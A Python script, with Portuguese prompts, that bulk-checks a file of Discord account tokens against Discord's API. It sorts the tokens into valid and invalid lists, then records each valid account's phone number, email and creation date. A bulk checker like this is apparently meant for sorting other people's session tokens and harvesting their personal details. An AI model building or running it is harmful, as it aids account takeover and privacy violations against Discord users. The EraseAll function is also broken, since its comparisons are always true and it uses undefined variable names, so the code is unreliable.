import string
import requests, os, sys, time, datetime, os.path
import colorama
from colorama import Fore, init, Back, Style


colorama.init()


def CheckUserToken() -> str:
    if not os.path.exists('./numeros/') and not os.path.exists('./tokens/'):
    	os.mkdir('numeros')
    	os.mkdir('tokens')
    with open('tokens.txt', 'r') as f: 
        for line in f:
            time.sleep(0)
            token = line.rstrip("\n")
            headers = {
                'Authorization': f'{token}'  
            }
            src = requests.get('https://discord.com/api/v8/users/@me', headers=headers) 
            try:
                if src.status_code == 200:
                    print(Fore.WHITE+"["+Style.BRIGHT + Fore.GREEN + Back.BLACK+"+"+Fore.WHITE+"] "+Fore.RESET + token)
                    if not os.path.exists("tokens/valid.txt"):
                        open('tokens/valid.txt', 'a+')
                    with open('tokens/valid.txt','a',encoding='utf8') as f:
                            f.write(token+'\n')                    
                else:
                    print(Fore.WHITE+"["+Style.BRIGHT + Fore.RED + Back.BLACK+"-"+Fore.WHITE+"] "+Fore.RESET + token)
                    if not os.path.exists("tokens/invalid.txt"):
                        open('tokens/invalid.txt', 'a+')
                    with open('tokens/invalid.txt','a',encoding='utf8') as f:
                        f.write(token+'\n')
            except Exception:
                print(f"{Fore.CYAN}Erro {Fore.RESET}")

def CheckNumber() -> str:
    with open('tokens/valid.txt', 'r') as f:
        i = 0
        for line in f:
            time.sleep(0)
            token = line.rstrip("\n")
            headers = {
                'Authorization': f'{token}'  
            }
            src = requests.get('https://discord.com/api/v8/users/@me', headers=headers) 
            src = src.json()
            try:
                get_phone = src['phone']
                get_id = src['id']
                get_email = src['email']
                date_create = datetime.datetime.utcfromtimestamp(((int(get_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%y %H:%M:%S')
            except Exception as e:
                pass
            try:
                if get_phone != None:
                    print(Fore.WHITE+"["+Style.BRIGHT + Fore.GREEN + Back.BLACK+"+"+Fore.WHITE+"] "+Fore.RESET + token + ' | ' + get_phone + ' | ' + date_create)
                    if not os.path.exists("numeros/verificado.txt"):
                        open('numeros/verificado.txt', 'a+')
                    with open('numeros/verificado.txt','a',encoding='utf8') as f:
                        f.write("\n\n####################################################")
                        f.write(f'\n\ntoken de número #{i}\n')
                        f.write(f'Token: {token}\n')
                        f.write(f'Celular: {get_phone}\n')
                        f.write(f'Criado em: {date_create}\n')
                        f.write(f'Email: {get_email}\n\n')
                        f.write("####################################################\n\n")
                        i = i+1                    
                else:
                    print(Fore.WHITE+"["+Style.BRIGHT + Fore.RED + Back.BLACK+"-"+Fore.WHITE+"] "+Fore.RESET + token + ' | None | '+date_create)
                    if not os.path.exists("numeros/noverified.txt"):
                        open('numeros/noverified.txt', 'a+')
                    with open('numeros/noverified.txt','a',encoding='utf8') as f:
                        f.write(token+ ' | None | '+date_create +'\n')
            except Exception as e:
                print(f"{Fore.CYAN} {e} {Fore.RESET}")



def EraseText() -> None:
    with open('./tokens.txt', 'r+') as f: 
        f.truncate(0)

def EraseAll() -> True or False:
	erase_Valid = input("Quer apagar os tokens válidos? Y/N ")
	erase_Invalid = input("Quer apagar os tokens inválidos? Y/N ")
	erase_Verified = input("Quer apagar os números verificados? Y/N ")
	erase_NoVerified = input("Quer apagar os números não verificados? Y/N ")

	if erase_Valid == 'Y' or 'y':
		with open('tokens/valid.txt', 'r+') as f:
			f.truncate(0)
	else:
		pass

	if erase_Invalid == 'Y' or 'y':
		with open('tokens/invalid.txt', 'r+') as f:
			f.truncate(0)
	else:
		pass
	if erase_verificado == 'Y' or 'y':
		with open('numeros/verificado.txt', 'r+') as f:
			f.truncate(0)
	else:
		pass
	if erase_noverified == 'Y' or 'y':
		with open('numeros/noverified.txt', 'r+') as f:
			f.truncate(0)
	else:
		pass
